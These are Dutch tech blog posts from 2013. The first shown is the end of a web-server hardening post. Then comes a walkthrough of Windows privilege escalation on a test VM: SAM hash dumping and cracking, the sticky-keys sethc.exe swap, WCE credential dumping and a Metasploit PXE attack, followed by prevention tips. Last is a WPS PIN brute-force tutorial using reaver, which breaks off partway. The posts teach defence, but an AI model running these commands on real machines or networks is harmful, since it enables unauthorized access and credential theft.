+Windows:<ul><li>Draai Apache, MySQL, etc als een aparte gebruiker.</li><li>Geef deze gebruiker zo weinig mogelijk rechten.</li><li>Optioneel: Blokkeer zoveel mogelijk uitgaande verbindingen.</li></ul>Linux:<ul><li>Maak de webuser niet de eigenaar van de webroot.</li><li>Zet de bestandsrechten zo strak mogelijk. Geef alleen schrijfrechten waar strikt noodzakelijk.</li><li>Optioneel: Blokkeer zoveel mogelijk uitgaande verbindingen.</li><li>Optioneel: Draai elke website als een andere user.</li></ul>Oh, en tot slot, even een notitie voor de nginx gebruikers. Tijdens het testen heb ik ook even naar newznab zelf gekeken. Het bleek dat onder Apache alle bestanden waar gebruikers niets te zoeken hebben netjes afgeschermd zijn met een '.htaccess' file. Nginx negeert deze bestanden echter compleet, dus het is wel even de moeite waard om hier in de config even regels voor te fabriceren <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)">.</div>
+			</div>
+			<div class="blogpost">
+				<h2><a href="https://autopwn.tweakblogs.net/blog/8632/beperkt-houdbaar.html">Beperkt houdbaar</a></h2>
+				<p class="author">
+					Door <a href="https://tweakers.net/gallery/98264/" rel="nofollow">Slurpgeit</a> op woensdag 23 januari 2013 22:57 - <a href="https://autopwn.tweakblogs.net/blog/8632/beperkt-houdbaar.html#reacties">Reacties (40)</a><br>Categorie: -, Views: 12.715
+				</p>
+				<div class="article">Om maar even met de deur in huis te vallen, dit wordt een klein stukje over Windows, en hoe je van een account met beperkte rechten naar Administrator kan (Of, mocht je op een domein zitten, Domain Administrator, yay!). En nee, dit is niet om je te leren computers over te nemen, maar juist wat je moet doen om het te voorkomen <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">.<br>
+<br>
+Voor dit verhaal heb ik een Windows 7 VM gemaakt, met de standaardgebruiker &quot;Henk&quot;:<br>
+<br>
+<img src="https://tweakers.net/camo/9f7c70c46f64a1aa8532ddce5d9a6bff01dbd62e/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fhenk.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/henk.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/henk.png"><br>
+<br>
+Henk wil graag administrator worden, anders kan hij SuperSexyCelebsNudeScreensaver.zip.png.scr.exe niet installeren, en dat zou toch jammer zijn. Er zijn meerdere manieren waarop hij dat kan doen.<br>
+<br>
+<b>Wachtwoorden kraken</b><br>
+Henk is niet helemaal vreemd met computers, en heeft ook wel wat ervaring met Linux. Ondanks dat zijn account enkel beperkte rechten heeft, kan hij de computer wel gewoon met een Live-CD van Ubuntu opstarten. En dat doet hij dan ook.<br>
+<br>
+Als de computer eenmaal opgestart is, kopiëert hij de volgende bestanden even naar een tijdelijke locatie (In vaktermen, /tmp):<ul><li>C:\Windows\System32\Config\SAM</li><li>C:\Windows\System32\Config\SYSTEM</li></ul><img src="https://tweakers.net/camo/834ebe5c99a4b2686887763a1593dccf4632d543/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fsam_system.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/sam_system.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/sam_system.png"><br>
+<br>
+Waarom? Omdat alle wachtwoorden voor de gebruikersaccounts in het SAM-bestand staan. Om deze uit te kunnen lezen heb je ook wat info uit het SYSTEM bestand nodig. Hiervoor heb je meerdere tooltjes, maar Henk gebruikt het gratis te verkrijgen <a href="http://code.google.com/p/creddump/" rel="external nofollow">creddump</a>. Even uitpakken (En wellicht <i>apt-get install python-crypto</i>), en draaien met:<br>
+<br>
+<div class="cmd"><pre>./pwdump.py /tmp/SYSTEM /tmp/SAM</pre></div><br>
+<br>
+En woei, hashes (Het wachtwoord in versleutelde vorm):<br>
+<br>
+<img src="https://tweakers.net/camo/448bcb3b353c5b33aa899219f7c6147ebf137c46/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fhashes.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/hashes.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/hashes.png"><br>
+<br>
+Het formaat in dit geval is:<blockquote><div class="quote">Gebruikersnaam:User ID:LM Hash:NTLM Hash</div></blockquote>Wat even belangrijk is om te weten, is dat een LM hash van <i>aad3b435b51404eeaad3b435b51404ee</i>, of een NTLM hash van <i>c7f06f0db9d571cf0f4408b777af3616</i> ook wel bekend staat als leeg, niks, noppes nada. Zoals hier te zien is, heeft alleen Henk zijn wachtwoord opgeslagen in LM formaat. Dat is voor Henk heel slecht, maar voor iemand die zijn wachtwoord wil kraken heel, heel goed. Waarom, dat wordt ietwat veel om in dit verhaal uit te leggen, maar als je zin hebt: <a href="http://en.wikipedia.org/wiki/LM_hash" rel="external nofollow">LM hash - Wikipedia</a>. <br>
+<br>
+Wat je voor dit verhaal moet weten, is dat LM hashes onwijs makkelijk te kraken zijn, en dat NTLM een stuk veiliger is. Ook staat het opslaan van LM hashes standaard uit vanaf Windows Vista. Toch zijn er bedrijven / systeembeheerders die dit nog gebruiken. Dus, herken jij jezelf in dit profiel? <span style="text-decoration:line-through">Soliciteer nu!</span> <a href="http://support.microsoft.com/kb/299656" rel="external nofollow">Doe eens niet!</a>. <br>
+<br>
+Kraaktijd! De eerste poging is een gewone brute-force aanval met <a href="http://www.openwall.com/john/" rel="external nofollow">John the Ripper</a>:<br>
+<br>
+<img src="https://tweakers.net/camo/d61b43383af9df1462cb0c629abf67a5d9fea2c9/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fjohn.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/john.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/john.png"><br>
+(De commandline spreekt voor zich in dit geval denk ik, kraak de LM hash in &quot;/tmp/hash_van_henk&quot; met john)<br>
+<br>
+Vanwege de manier waarop LM hashing werkt, wordt het wachtwoord in twee delen gekraakt, en is de uitkomst altijd uppercase. Dus aan elkaar geplakt komt er een wachtwoord uit van <i>W4CHTW00RDH3NK</i>. <br>
+<br>
+Helaas gaat Windows dat niet accepteren. Maar we kunnen dit wachtwoord wel gebruiken voor een aanval op het NTLM gedeelte van de hash. Het reeds achterhaalde wachtwoord zetten we in /tmp/wordlist, en voeren nog een aanval met John uit:<br>
+<br>
+<img src="https://tweakers.net/camo/09a0a54c07f2e8e462be53739a6c6a3c743ae86c/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fjohn_ntlm.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/john_ntlm.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/john_ntlm.png"><br>
+<br>
+Wat je hier ziet is John die de NTLM hash probeert te kraken met &quot;W4CHTW00RDH3NK&quot; als enige woord. --rules zorgt ervoor dat er enkele regels toegepast worden, waaronder het vervangen van hoofdletters met kleinere letters. <br>
+<br>
+Dit hele proces neemt al snel 15 minuten of meer in beslag, en zoveel geduld opbrengen is lastig. Gelukkig hebben we de <span style="text-decoration:line-through">foto's</span> rainbow tables nog! Wat rainbow tables precies zijn ga ik wederom niet uitleggen, maar mocht je het echt heel heel heel heul heul graag willen weten, zie dan <a href="http://en.wikipedia.org/wiki/Rainbow_table" rel="external nofollow">hier</a>. Het enige wat je nu moet weten, is dat het kraken van LM hashes met rainbow tables echt <b>retesnel</b> is. De tool in dit geval is <a href="http://sourceforge.net/projects/rcracki/" rel="external nofollow">rcracki_mt</a>, en de command line is als volgt:<br>
+<br>
+<div class="cmd"><pre>./rcracki_mt -f /tmp/hash_van_henk -t 4 /storage/RT/LM/lm_all-space#1-7_0/*</pre></div><ul><li>./rcracki_mt - Programma</li><li>-f /tmp/hash_van_henk - De te kraken hash</li><li>-t 4 - Gebruik 4 threads (Is die dure CPU toch nog ergens goed voor)</li><li>./rcracki_mt -f /tmp/hash_van_henk -t 4 /storage/RT/LM/lm_all-space#1-7_0/* - Gebruik alle tables in de map <i>lm_all-space#1-7_0</i></li></ul>Deze set rainbow tables bestaat uit:<ul><li>lm_all-space#1-7_0</li><li>lm_all-space#1-7_1</li><li>lm_all-space#1-7_2</li><li>lm_all-space#1-7_3</li></ul>Het pakketje is in totaal 34GB, en is gratis te <a href="http://freerainbowtables.com/nl/tables2/" rel="external nofollow">downloaden.</a> Leuk feitje is dat met deze tables de kans van kraken van een LM hash 99,9% is. En het is dan ook erg snel gedaan met het wachtwoord van Henk:<br>
+<br>
+<img src="https://tweakers.net/camo/98adee20ff4238c8bd9c0dc570f324569059ebb9/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Frcracki.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/rcracki.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/rcracki.png"><br>
+<br>
+Kijk, dat zien we graag. Klaar in minder dan een halve minuut, en rcracki_mt heeft zelf al uitgezocht hoe het zit met hoofdletters. Remember kids, a lazy hacker is a good hacker.<br>
+<br>
+Helaas voor Henk, is het wachtwoord van <i>MrAdmin</i> niet in LM hash opgeslagen, en met je z'n eigen gekraakte wachtwoord kan hij niet zo veel (Maar het is wel verdomd handig voor dit verhaal). Hij kan de NTLM variant wel proberen te kraken, maar dat gaat waarschijnlijk aanzienlijker langer duren, dus tijd voor een ander truukje.<br>
+<br>
+<b>Sticky Keys</b><br>
+Ken je dat? Ben je lekker aan het gamen, krijg je opeens een piepje uit de krochten van de hel en / of pc-speaker, en dit venstertje gooit je game naar de taakbalk:<br>
+<br>
+<img src="https://tweakers.net/camo/b977039bcf4ccb2d2b1b97f9d0ec81a6b46a0a27/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fstickeykeys.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/stickeykeys.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/stickeykeys.png"><br>
+<br>
+Wat blijkt, na 5 keer op de shift toets drukken komt dit omhoog. Als je dat doet, opent Windows het programma <i>C:\Windows\System32\sethc.exe</i>, ook voordat een gebruiker ingelogd is, op het aanmeldscherm.<br>
+<br>
+Omdat Henk toch nog in een Linux omgeving is, heeft hij niks met Windows permissions te maken, en kan hij gewoon het volgende doen:<br>
+<br>
+<img src="https://tweakers.net/camo/defafdc0a77f87d679773523d39a5362f3c2a7aa/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fsethc.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/sethc.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/sethc.png"><br>
+<br>
+Oftewel: verplaats sethc.exe naar sethc.exe.bak, en kopiëer cmd.exe naar sethc.exe. Henk herstart de PC, en drukt bij het inlogscherm 5 keer op shift:<br>
+<br>
+<img src="https://tweakers.net/camo/085b973d7e96d01bda3eaaefc9caa3ee682e20b7/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fsethc_system.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/sethc_system.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/sethc_system.png"><br>
+<br>
+W00t! Een shell, op het inlogscherm, als NT AUTHORITY\SYSTEM (Hogere rechten bestaan niet op een Windows systeem). Zou ik explorer kunnen starten?:<br>
+<br>
+<img src="https://tweakers.net/camo/fa6437a887477e1700f8cd15d91fdf70cd8d828e/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fexplorer_starting.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/explorer_starting.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/explorer_starting.png"><br>
+<br>
+<img src="https://tweakers.net/camo/b2c52004101f985e17adee5e878e2f456d3609b6/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fexplorer_started.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/explorer_started.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/explorer_started.png"><br>
+<br>
+Hmm, een beetje vreemd, maar wel lekker. Een desktopomgeving in je aanmeldscherm! Maar, genoeg gespeeld, tijd voor de climax:<br>
+<br>
+<img src="https://tweakers.net/camo/2a831aed91e74f9f9bd950d0aabc2cd4a34547a5/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fhenk_admin.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/henk_admin.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/henk_admin.png"><br>
+<br>
+<img src="https://tweakers.net/camo/e9667947d5d7cc07c51647838c29b15f66f39c27/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fhenk_admin_2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/henk_admin_2.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/henk_admin_2.png"><br>
+<br>
+Profit!  Henk is lid van de Administrator groep, en kan eindelijk zijn nieuwe screensaver installeren. Ook heeft Henk nu wat meer mogelijkheden om alsnog achter het wachtwoord van <i>MrAdmin</i> te komen. <br>
+<br>
+Hij wacht tot <i>MrAdmin</i> een keer inlogt op de pc, en zich niet goed afmeld. Dan pakt Henk de onwijs handige tool <a href="http://www.ampliasecurity.com/research/wcefaq.html" rel="external nofollow">wce</a>. Wat kan WCE? Nou, dit:<br>
+<br>
+<img src="https://tweakers.net/camo/93694a47383e08794568d01f1a83c035d32aa6ce/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fwce.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/wce.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/wce.png"><br>
+<br>
+Ja, je ziet het goed. Zolang een gebruiker ingelogd is, of zolang er een service draait als een bepaalde gebruiker, kan WCE het wachtwoord plaintext uit het geheugen vissen. Oók als het gaat om gebruikers in een Windows domein (Dus, Admins op Terminal Servers, niet doen hè?).<br>
+<br>
+<b>Kan dat niet makkelijker?</b><br>
+Ja hoor, veel makkelijker, er bestaat namelijk iets als <a href="http://www.piotrbania.com/all/kon-boot/" rel="external nofollow">kon-boot</a>. Is niet gratis, maar wel very much handig. Want zodra je van de kon-boot cd opstart, kan je in alle accounts op de computer inloggen zonder een wachtwoord in te voeren, en wordt het sticky keys truukje van hierboven automatisch toegepast:<br>
+<br>
+<div class="video-wrapper"><div class="video-container"><noscript class="lazycontent"><iframe data-thumbnail="https://tweakers.net/camo/3d08240ecc13b78f8c6cc29596eee7e87726246a/?url=https%3A%2F%2Fi.ytimg.com%2Fvi%2FcdZnUdZjapE%2Fhqdefault.jpg" width="439" height="329" src="https://www.youtube.com/embed/cdZnUdZjapE?feature=oembed&amp;enablejsapi=1" frameborder="0" allowfullscreen=""></iframe></noscript></div></div><br>
+<br>
+<b>Maar ik kan helemaal niet van CD starten, maar onze beheerder heeft de computers wel zo ingesteld dat ze via PXE boot een image kunnen downloaden</b><br>
+Nou, dat maakt het nog een stukje makkelijker. De populaire tool <a href="http://www.metasploit.com/" rel="external nofollow">Metasploit</a> heeft hier namelijk een prachtige module voor:<br>
+<br>
+<img src="https://tweakers.net/camo/68f27e2ed2db3545bc4a1a84a902192d8890a06d/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fpxexploit.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/pxexploit.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/pxexploit.png"><br>
+<br>
+Wat dit doet? Het start een eigen PXE server, een computer start er automatisch van op en er wordt een gebruiker &quot;metasploit&quot; toegevoegd, en lid gemaakt van de Administrator groep. Ook zet het een eventuele firewall uit, en installeert het een service waar metasploit naar kan verbinden om <a href="http://dev.metasploit.com/documents/meterpreter.pdf" rel="external nofollow">Meterpreter</a>  te starten op de machine (Een soort shell++, mocht je er meer over willen weten, even googlen <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">). <br>
+<br>
+Wat in actie screenshots dan, voor die techneuten die nu nog steeds benieuwd zijn:<br>
+<br>
+<img src="https://tweakers.net/camo/71fa2b2f4199899a0b9d2bf29f7108297707e552/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fpxerun.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/pxerun.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/pxerun.png"><br>
+<br>
+<img src="https://tweakers.net/camo/257fcc7c4455bc5b41dd4448e165b929774e51d8/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fpxedhcp.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/pxedhcp.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/pxedhcp.png"><br>
+<br>
+<img src="https://tweakers.net/camo/11c678eff90e3be61cc7c20119490aa749197d18/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fpxeattack.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/pxeattack.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/pxeattack.png"><br>
+<br>
+<img src="https://tweakers.net/camo/1532b44f208a43efcc5356885e12c51597c7bb92/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fpxe2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/pxe2.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/pxe2.png"><br>
+<br>
+<img src="https://tweakers.net/camo/ce407277363345c7acd098a05bbcafeaa230f288/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fpxe3.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/pxe3.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/pxe3.png"><br>
+<br>
+Dat allemaal automagisch, et voilá:<br>
+<br>
+<img src="https://tweakers.net/camo/e08aa13b30e196e23ce5658e94a53b1f9a0abb0a/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fbeperkt%2Fmetasploituser.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/beperkt/metasploituser.png" title="https://dl.dropbox.com/u/7521450/blog/beperkt/metasploituser.png"><br>
+<br>
+Hoe makkelijk wil je het hebben <img src="https://tweakers.net/g/s/vork.gif" width="20" height="15" alt=":Y)">.<br>
+<br>
+<b>Eek! (Tuuunununununuuu) Hoe voorkom ik dit?</b><ul><li>Zorg (voor oudere operating systems en domeinen) dat het gebruik van LM hashes uit staat</li><li>Zet een wachtwoord op je BIOS.</li><li>Zorg dat het eerste boot device je HDD is.</li><li>Zorg eventueel voor disk encryptie</li><li>Don't be an idiot <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)"></li></ul></div>
+			</div>
+			<div class="blogpost">
+				<h2><a href="https://autopwn.tweakblogs.net/blog/8579/wifileaks-pt-punt-ii.html">Wifileaks Pt. II</a></h2>
+				<p class="author">
+					Door <a href="https://tweakers.net/gallery/98264/" rel="nofollow">Slurpgeit</a> op donderdag  3 januari 2013 20:20 - <a href="https://autopwn.tweakblogs.net/blog/8579/wifileaks-pt-punt-ii.html#reacties">Reacties (50)</a><br>Categorie: -, Views: 19.340
+				</p>
+				<div class="article">Eigenlijk was ik al een hele tijd van plan dit blogje te schrijven, naar aanleiding van een <a href="https://autopwn.tweakblogs.net/blog/8521/wifileaks.html#r_117771" rel="external">comment</a> op mijn vorige blog. Toen zag ik vandaag opeens dat de Consumentenbond <a href="http://www.consumentenbond.nl/test/elektronica-communicatie/internet-en-software/draadloze-routers/extra/wps-lek/" rel="external nofollow">mij al voor was.</a> WTF! Oh well, dan heb ik nu wat extra draagvlak <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)">.<br>
+<br>
+Voor de technische voodoo begint, een kleine, maar nodige inleiding naar de wondere wereld van WPS. Het is ooit verzonnen om het makkelijk te maken nieuwe apparaten toe te voegen aan een netwerk met een onwijs lang WiFi wachtwoord, zonder dat elke keer in te hoeven tikken. Hiervoor zijn twee oplossingen bedacht.<br>
+<br>
+<b>De knop</b><br>
+Bij deze oplossing is het de bedoeling dat je een apparaat vraagt verbinding te maken met het netwerk, en als het apparaat het je héééél lief vraagt, of je dan alsje- alsje- alsjeblieft de knop op je router of accesspoint wil indrukken. Op de Linksys router die ik voor dit verhaaltje gebruik ziet die knop er zo uit:<br>
+<br>
+<img src="https://tweakers.net/camo/dfa54410ab0c473a387691a0593468759a76657c/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fbutton.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/button.png" title="https://dl.dropbox.com/u/7521450/blog/wps/button.png"><br>
+<br>
+In principe is dit gewoon &quot;veilig&quot;. Iemand die daar misbruik van wil maken moet namelijk al in je huiskamer staan, en dan heb je grotere kopzorgen dan je draadloze netwerk <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">.<br>
+<br>
+<b>De PIN</b><br>
+Hier wordt het lachen geblazen. De tweede oplossing is namelijk het invoeren van de pincode die onderop je router / accesspoint staat, in het apparaat wat je wil verbinden. Een soort vervanging van je super lange wifi wachtwoord dus. Onderop mijn Linksys zit dan ook de volgende sticker:<br>
+<br>
+<img src="https://tweakers.net/camo/2b7a023c4c6bee05ff370f6fc5be44ed5de3e0e0/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fpin.jpg" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/pin.jpg" title="https://dl.dropbox.com/u/7521450/blog/wps/pin.jpg"><br>
+<br>
+Oké, super. Acht karakters, dat is dus 10x10x10x10x10x10x10x10 (Of 10^8 voor jullie wiskundefreaks) = 100.000.000 combinaties. Uit ervaring kan ik je vertellen dat in een real-life situatie, het brute forcen van de PIN je ongeveer 4 seconden van je leven kost, per poging. Dat komt uit op een bruto van  12,7 jaar. Niet echt de moeite.<br>
+<br>
+Toen dacht iemand bij de implementatie, dit kan handiger. In plaats van gewoon alle acht getallen goed of fout keuren bij een transactie, krijg je een andere reactie terug van het accespoint of de router als de eerste 4 karakters fout zijn, dan als dat deze juist zijn. Daarmee wordt het aantal pogingen al 10x10x10x10 + 10x10x10x10 (10^4 + 10^4) = 20.000 pogingen. <br>
+<br>
+Maar, dat was nog niet handig genoeg. Het laatste getal van de 8 is geen willekeurig getal, maar een checksum van de eerste 7. Hoe deze berekend wordt is voor jullie als aanvaller niet heel belangrijk, maar deze is dus te berekenen aan de hand van de eerste 7 karakters. Klinkt ingewikkeld, maar kijk even mee lieve kijkbuiskinders. De uiteindelijke formule voor het maximaal aantal pogingen (van 00000000 - 99999999) wordt dus 10x10x10x10 + 10x10x10 (10^4 + 10^3, het laatste getal van de 8 is namelijk voor elke combinatie te berekenen.) = 11.000. <br>
+<br>
+Dat zijn zo'n 99.989.000 benodigde pogingen minder die nodig zijn om de juiste PIN te vinden. In tijd uitgedrukt wordt dat in plaats van 12,7 jaar, bij 4 seconden per pin, zo'n 12,2 uur. Dat is een aardig verschil, en gewoon in één dag te doen. Als je dan ook nog eens een net iets betere WiFi stick / antenne regelt, kan je de tijd bijna halveren naar 2 seconden per pin (6 uur). En dat is om van 00000000 naar 99999999 te gaan. Dus als jouw pincode 12344321 is, ben je aardig snel de spreekwoordelijke Sjaak.<br>
+<br>
+<b>Is het dan echt zo erg?</b><br>
+Ondertussen is het wel bekend dat ik een groot fan van plaatjes ben, dus dit is een screenshot van alle accesspoints die ik kan ontvangen, waar WPS ingeschakeld staat (Gemaakt met een tooltje genaamd &quot;Wash&quot;, later meer daarover):<br>
+<br>
+<img src="https://tweakers.net/camo/fdc7e82e9d6530686883838432a406d28ea1e66a/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fwash.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/wash.png" title="https://dl.dropbox.com/u/7521450/blog/wps/wash.png"><br>
+<br>
+Of tenminste, dit is wat er op mijn scherm paste, de lijst gaat nog door. Al deze netwerken zijn met 95% zekerheid kwetsbaar voor deze aanval. Het enige belangrijke punt is dat het bereik goed genoeg is voor de WPS transacties.<br>
+<br>
+Voor de tweakers onder ons, in Wireshark ziet een accesspoint met WPS ingeschakeld er zo uit:<br>
+<br>
+<img src="https://tweakers.net/camo/31ce60b28d56b4a8e5f6ebc216b31a84d82365fd/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fwps_wireshark.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/wps_wireshark.png" title="https://dl.dropbox.com/u/7521450/blog/wps/wps_wireshark.png"><br>
+<br>
+<b>Oke, en dan?</b><br>
+Enter <a href="http://code.google.com/p/reaver-wps/" rel="external nofollow">reaver-wps</a>. Een tooltje speciaal gemaakt om deze aanval uit te voeren. Gebundeld met reaver-wps is een tooltje genaamd &quot;Wash&quot;, wat kan scannen naar netwerken met WPS ingeschakeld.<br>
+<br>
+Voor deze demo heb ik zelf een Linksys E3000 ingesteld als accesspoint, met de laatste standaard firmware (Versie 1.0.0.4), netwerknaam &quot;Henk&quot; (Omdat waarom niet?). Die kan je in het screenshot hierboven ook terug vinden. Vervolgens gooi ik het volgende commando in mijn Ubuntu terminal:<br>
+<br>
+<div class="cmd"><pre>reaver -b 00:25:9C:**:**:** -c 11 -vv --dh-small --no-nacks -i mon0</pre></div><br>
+<br>
+Huh, wasda?<ul><li>reaver - Naam van het programma</li><li>-b 00:25:9C:**:**:** - MAC Adres van het accesspoint (Gewoon te zien in tooltjes als Wash en airodump-ng, geanonimiseerd voor dit verhaal <img src="https://tweakers.net/g/s/wink.gif" width="15" height="15" alt=";)">)</li><li>-c 11 - Het kanaal van het accesspoint, in dit geval 11. Deze optie is niet nodig, maar kan de aanval wat versnellen als het accesspoint toch niet automatisch van kanaal wisselt.</li><li>-vv - Geef me meer output! Ik wil zoveel mogelijk info terugzien.</li><li>--dh-small - Gebruik een kleinere Diffie&#8211;Hellman key om de transactie te versleutelen. Verlaagt de CPU load op het aan te vallen accesspoint en verhoog de snelheid van de aanval</li><li>--no-nacks - Stuur geen NACK pakketje terug als de volgorde van de pakketjes door elkaar loopt. Niet echt spannend om de precieze betekenis te weten, als je maar onthoud dat sommige accesspoints met deze optie veel sneller aangevallen kunnen worden.</li><li>-i mon0 - De WiFi interface om te gebruiken voor de aanval, in mijn geval mon0.</li></ul>Dan krijg je het volgende te zien:<br>
+<br>
+<img src="https://tweakers.net/camo/67301c60ef888c24545751503233a1c7ac82dd22/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fpart1.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/part1.png" title="https://dl.dropbox.com/u/7521450/blog/wps/part1.png"><br>
+<br>
+Het belangrijke gedeelte heb ik hier even omcirkeld. Wat je hier ziet is dat na de &quot;M4 Message&quot; het accesspoint een &quot;WSC Nack&quot; terug stuurt. Wat dat is, is niet heel belangrijk, maar onthou even dat dat nu na M4 komt.<br>
+<br>
+Na een paar uur proberen, gaat reaver uiteindelijk de eerste 4 cijfers goed raden.  Dan ziet de uitkomst er opeens zo uit:<br>
+<br>
+<img src="https://tweakers.net/camo/45ce991f4e9d8cc0546ec562c304f1158fe4b512/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fpart2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/part2.png" title="https://dl.dropbox.com/u/7521450/blog/wps/part2.png"><br>
+<br>
+De oplettende lezer heeft het natuurlijk allang gezien, maar er is iets anders. Waar de &quot;WSC Nack&quot; net al na de &quot;M4 Message&quot; kwam, komt hij nu pas na de &quot;M6 message&quot;. Hieraan is te zien of de eerste 4 cijfers van de PIN kloppen of niet. <br>
+<br>
+Op dit punt zal het percentage van reaver naar 90% springen, en gaat hij proberen de rest goed te raden. Uiteindelijk worden alle 8 cijfers goed geraden en krijg je dit te zien:<br>
+<br>
+<img src="https://tweakers.net/camo/733669c5eafc133deabfe1f8ad3836bb2a6b2f8c/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fwps%2Fpart3.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/wps/part3.png" title="https://dl.dropbox.com/u/7521450/blog/wps/part3.png"><br>
+<br>
+De &quot;M&quot; messages lopen door tot 7, en het accesspoint geeft netjes de WPA sleutel af. Om Po maar eens te quoten: &quot;Uh-oh&quot;.<br>
+<br>
+<b>Wat kan je nu dan?</b><br>
